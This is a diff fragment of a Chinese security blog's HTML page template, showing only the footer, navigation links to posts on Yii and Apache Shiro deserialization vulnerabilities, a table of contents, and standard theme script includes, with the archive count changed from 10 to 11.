+      </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/09/21/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">CVE-2020-15148 Yii框架反序列化</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">Apache Shiro 1.2.4反序列化漏洞</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">
           环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">
           漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">
           漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">
-          参考文章</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author_images.png" alt="avatar"></div><p class="sidebar-ov-author__text">按时吃饭</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">10</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span>%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>whippet</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>
+          参考文章</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author_images.png" alt="avatar"></div><p class="sidebar-ov-author__text">按时吃饭</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">11</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span>%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>whippet</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script></body></html>
